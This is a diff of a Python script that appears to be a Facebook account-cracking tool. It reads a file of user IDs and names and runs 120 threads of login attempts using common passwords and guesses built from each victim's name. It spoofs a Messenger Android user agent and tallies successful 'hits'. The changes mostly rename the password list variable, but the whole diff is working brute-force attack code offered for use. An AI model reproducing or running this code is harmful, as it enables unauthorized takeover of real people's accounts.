@@ -82,7 +82,7 @@ def gxdsfiles():
     os.system('clear')
     print(lxgo)
     if gxdsoption1 in ["GXDS"]:
-     print(gxdsprnt)
+        print(gxdsprnt)
     fl=input("  [-] INPUT YOUR OWN FB IDS FILE TO START CRACKING.\n  \033[1;33m[•] FILE PATH: ")
     os.system('clear')
     print(lxgo)
@@ -110,19 +110,19 @@ def gxdsforward(id_file):
     with ThreadPool (max_workers=120) as feel:
         for data in id_file:
             uid=data.split("|")[0]
-            pwx=[]
-            pwx.append('12345678')
-            pwx.append('P@ssw0rd')
-            pwx.append('123456')
-            pwx.append('iloveyou')
-            pwx.append('iloveyou123')
-            pwx.append('1234567890')
-            pwx.append('password')
-            pwx.append('password123')
-            pwx.append('Password')
-            pwx.append('Password123')
-            pwx.append('qwerty123')
-            pwx.append('123456789')
+            gxdpwd=[]
+            gxdpwd.append('12345678')
+            gxdpwd.append('P@ssw0rd')
+            gxdpwd.append('123456')
+            gxdpwd.append('iloveyou')
+            gxdpwd.append('iloveyou123')
+            gxdpwd.append('1234567890')
+            gxdpwd.append('password')
+            gxdpwd.append('password123')
+            gxdpwd.append('Password')
+            gxdpwd.append('Password123')
+            gxdpwd.append('qwerty123')
+            gxdpwd.append('123456789')
             nam=data.split("|")[1]
             name=nam.lower()
             try:
@@ -131,17 +131,17 @@ def gxdsforward(id_file):
                 if len(name1) <3:
                     pass
                 else:
-                    pwx.append(nam1+'123')
-                    pwx.append(name1+'12')
-                    pwx.append(name1+'123')
-                    pwx.append(name1+'123')
-                    pwx.append(name1+'1234')
-                    pwx.append(name1+'12345')
-                    pwx.append(name1+'@123')
-                    pwx.append(name1+'pogi')
-                    pwx.append(name1+'ganda')
-                    pwx.append(name1+'143')
-                    pwx.append(name1+'@143')
+                    gxdpwd.append(nam1+'123')
+                    gxdpwd.append(name1+'12')
+                    gxdpwd.append(name1+'123')
+                    gxdpwd.append(name1+'123')
+                    gxdpwd.append(name1+'1234')
+                    gxdpwd.append(name1+'12345')
+                    gxdpwd.append(name1+'@123')
+                    gxdpwd.append(name1+'pogi')
+                    gxdpwd.append(name1+'ganda')
+                    gxdpwd.append(name1+'143')
+                    gxdpwd.append(name1+'@143')
             except:pass
             try:
                 mid_name=name.split(" ")[1]
@@ -149,32 +149,32 @@ def gxdsforward(id_file):
                 if len(mid_name) <3:
                     pass
                 else:
-                    pwx.append(nam1+" "+nam2)
-                    pwx.append(mid_name+'12')
-                    pwx.append(mid_name+'123')
-                    pwx.append(mid_name+' 123')
-                    pwx.append(mid_name+'1234')
-                    pwx.append(mid_name+'12345')
-                    pwx.append(mid_name+'@#')
-                    pwx.append(mid_name+'@@')
-                    pwx.append(mid_name+'@')
-                    pwx.append(mid_name+'@123')
+                    gxdpwd.append(nam1+" "+nam2)
+                    gxdpwd.append(mid_name+'12')
+                    gxdpwd.append(mid_name+'123')
+                    gxdpwd.append(mid_name+' 123')
+                    gxdpwd.append(mid_name+'1234')
+                    gxdpwd.append(mid_name+'12345')
+                    gxdpwd.append(mid_name+'@#')
+                    gxdpwd.append(mid_name+'@@')
+                    gxdpwd.append(mid_name+'@')
+                    gxdpwd.append(mid_name+'@123')
                     #-Mix
-                    pwx.append(name1+mid_name)
-                    pwx.append(name1+mid_name+'143')
-                    pwx.append(name1+mid_name+'12')
-                    pwx.append(name1+mid_name+'123')
-                    pwx.append(name1+mid_name+'1234')
-                    pwx.append(name1+mid_name+'12345')
-                    pwx.append(name1+mid_name+'@#')
-                    pwx.append(name1+mid_name+'@@')
-                    pwx.append(name1+mid_name+'@')
-                    pwx.append(name1+mid_name+'@123')
-                    pwx.append(name1+' '+mid_name)
-                    pwx.append(name1+' '+mid_name+'123')
-                    pwx.append(name1+' '+mid_name+'143')
-                    pwx.append(name1+' '+mid_name+'1234')
-                    pwx.append(name1+' '+sur_name)
+                    gxdpwd.append(name1+mid_name)
+                    gxdpwd.append(name1+mid_name+'143')
+                    gxdpwd.append(name1+mid_name+'12')
+                    gxdpwd.append(name1+mid_name+'123')
+                    gxdpwd.append(name1+mid_name+'1234')
+                    gxdpwd.append(name1+mid_name+'12345')
+                    gxdpwd.append(name1+mid_name+'@#')
+                    gxdpwd.append(name1+mid_name+'@@')
+                    gxdpwd.append(name1+mid_name+'@')
+                    gxdpwd.append(name1+mid_name+'@123')
+                    gxdpwd.append(name1+' '+mid_name)
+                    gxdpwd.append(name1+' '+mid_name+'123')
+                    gxdpwd.append(name1+' '+mid_name+'143')
+                    gxdpwd.append(name1+' '+mid_name+'1234')
+                    gxdpwd.append(name1+' '+sur_name)
             except:pass
             try:
                 sur_name=name.split(" ")[2]
@@ -182,31 +182,31 @@ def gxdsforward(id_file):
                 if len(sur_name) <3:
                     pass
                 else:
-                    pwx.append(sur_name+'123')
-                    pwx.append(sur_name+'1234')
-                    pwx.append(sur_name+'12345')
-                    pwx.append(sur_name+'143')
-                    pwx.append(name1+mid_name+sur_name)
-                    pwx.append(name1+mid_name+sur_name+'123')
-                    pwx.append(name1+mid_name+sur_name+'1234')
-                    pwx.append(name1+mid_name+sur_name+'12345')
-                    pwx.append(name1+mid_name+sur_name+'@#')
-                    pwx.append(name1+mid_name+sur_name+'@@')
-                    pwx.append(name1+mid_name+sur_name+'@')
-                    pwx.append(name1+' '+mid_name+' '+sur_name)
-                    pwx.append(name1+' '+mid_name+' '+sur_name+'123')
+                    gxdpwd.append(sur_name+'123')
+                    gxdpwd.append(sur_name+'1234')
+                    gxdpwd.append(sur_name+'12345')
+                    gxdpwd.append(sur_name+'143')
+                    gxdpwd.append(name1+mid_name+sur_name)
+                    gxdpwd.append(name1+mid_name+sur_name+'123')
+                    gxdpwd.append(name1+mid_name+sur_name+'1234')
+                    gxdpwd.append(name1+mid_name+sur_name+'12345')
+                    gxdpwd.append(name1+mid_name+sur_name+'@#')
+                    gxdpwd.append(name1+mid_name+sur_name+'@@')
+                    gxdpwd.append(name1+mid_name+sur_name+'@')
+                    gxdpwd.append(name1+' '+mid_name+' '+sur_name)
+                    gxdpwd.append(name1+' '+mid_name+' '+sur_name+'123')
             except:pass
-            feel.submit(file_subb,uid,pwx)
+            feel.submit(file_subb,uid,gxdpwd)
 
 loop=0
 oks=[]
 cps=[]
-def file_subb(uid,pwx):
+def file_subb(uid,gxdpwd):
     global oks,loop,cps
     sys.stdout.write(f"\r \033[1;97m [CHECKED]: {loop} [HITS]: {str(len(oks))} [CHECKPOINT]: {str(len(cps))}");sys.stdout.flush()
     session=requests.Session()
     try:
-        for ps in pwx:
+        for ps in gxdpwd:
             user_agent="Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
             data = {
             "adid": str(uuid.uuid4()),
